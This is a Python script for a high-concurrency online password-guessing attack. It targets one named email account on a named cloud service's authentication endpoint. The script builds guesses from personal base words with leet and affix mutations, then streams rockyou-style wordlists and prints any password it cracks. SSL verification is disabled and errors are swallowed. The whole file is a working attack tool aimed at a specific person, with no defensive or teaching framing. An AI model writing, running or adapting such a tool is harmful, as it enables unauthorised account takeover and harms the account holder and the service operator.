import asyncio
import aiohttp
import time
import os
import sys

URL = "https://vm.play2go.cloud/api/auth/v4/public/token"
EMAIL = "hobotzode1@gmail.com"
CONCURRENCY = 200

CUSTOM_BASES = [
    "sezaze72", "Romart01", "sezaze", "romart", "Sezaze",
    "hobotzode", "hobotzode1", "Hobotzode1", "Hobotzode",
    "play2go", "Play2Go", "cloud", "Cloud",
    "play2gocloud", "Play2GoCloud", "vmmanager",
]

LEET = str.maketrans("aAeEiIoOsStT", "@@33!!00$$77")
LEET2 = str.maketrans("aAeEiIoOsStTlL", "4433!!0055771!")

SUFFIXES = [
    "", "!", "!!", "!!!", "1", "12", "123", "1234", "12345",
    "01", "00", "69", "77", "88", "99", "007",
    "!@", "!@#", "@", "#", "$", "*", "?",
    "2024", "2025", "2026", "_", "-",
]

PREFIXES = ["", "!", "@", "1", "123"]

WORDLISTS = [
    "rockyou_full.txt",
    "ncsc100k.txt",
    "rockyou75.txt",
]

found = False
tried = 0
start_time = 0


async def worker(sem, session, queue):
    global found, tried
    while not found:
        pw = await queue.get()
        if pw is None:
            queue.task_done()
            break
        async with sem:
            if found:
                queue.task_done()
                continue
            try:
                async with session.post(
                    URL, json={"email": EMAIL, "password": pw},
                    ssl=False, timeout=aiohttp.ClientTimeout(total=10)
                ) as resp:
                    tried += 1
                    if resp.status == 200:
                        data = await resp.json()
                        found = True
                        elapsed = time.time() - start_time
                        print(f"\n{'='*50}")
                        print(f"[+] CRACKED! Password: {pw}")
                        print(f"[+] Response: {data}")
                        print(f"[*] {tried:,} attempts in {elapsed:.1f}s")
                        queue.task_done()
                        return
                    if tried % 2000 == 0:
                        elapsed = time.time() - start_time
                        rps = tried / elapsed if elapsed > 0 else 0
                        print(f"  [{tried:,}] {rps:.0f} req/s", flush=True)
            except:
                pass
            queue.task_done()


async def main():
    global start_time, tried, found
    start_time = time.time()
    seen = set()
    queue = asyncio.Queue(maxsize=10000)

    connector = aiohttp.TCPConnector(limit=CONCURRENCY, limit_per_host=CONCURRENCY, ssl=False)
    sem = asyncio.Semaphore(CONCURRENCY)

    async with aiohttp.ClientSession(connector=connector) as session:
        # start workers
        workers = [asyncio.create_task(worker(sem, session, queue)) for _ in range(CONCURRENCY)]

        async def enqueue(pw):
            if found:
                return
            if pw and 4 <= len(pw) <= 40 and pw not in seen:
                seen.add(pw)
                await queue.put(pw)

        # Phase 1: custom mutations
        print("[*] Phase 1: Custom mutations")
        for base in CUSTOM_BASES:
            if found:
                break
            forms = [
                base, base.lower(), base.upper(), base.capitalize(),
                base.swapcase(), base[::-1],
                base.translate(LEET), base.translate(LEET2),
            ]
            for f in forms:
                for pre in PREFIXES:
                    for suf in SUFFIXES:
                        await enqueue(pre + f + suf)

        # Phase 1b: combos
        print(f"[*] Phase 1b: Combos (tried {tried:,} so far)")
        for a in CUSTOM_BASES[:8]:
            for b in CUSTOM_BASES[:8]:
                if a != b and not found:
                    for suf in ["", "!", "123", "1"]:
                        await enqueue(a + b + suf)
                        await enqueue(a + "_" + b + suf)

        p1 = len(seen)
        print(f"[*] Phase 1 done: {p1:,} custom passwords, {tried:,} tried")

        # Phase 2: stream wordlists
        print("[*] Phase 2: Wordlists (streaming)")
        for path in WORDLISTS:
            if found or not os.path.exists(path):
                continue
            fname = os.path.basename(path)
            print(f"  Streaming {fname}...")
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if found:
                        break
                    base = line.strip()
                    if not base or len(base) < 4 or len(base) > 30:
                        continue
                    # raw
                    await enqueue(base)
                    # capitalize
                    await enqueue(base.capitalize())
                    # + ! and + 123
                    await enqueue(base + "!")
                    await enqueue(base + "123")
                    await enqueue(base.capitalize() + "!")
                    await enqueue(base.capitalize() + "123")
                    await enqueue(base + "!!")
                    await enqueue(base + "01")

        # signal workers to stop
        for _ in range(CONCURRENCY):
            await queue.put(None)

        await asyncio.gather(*workers)

    elapsed = time.time() - start_time
    if not found:
        print(f"\n{'='*50}")
        print(f"[-] No match.")
    print(f"[*] Total: {tried:,} attempts, {len(seen):,} unique, {elapsed:.1f}s ({tried/elapsed:.0f} req/s)")


if __name__ == "__main__":
    asyncio.run(main())
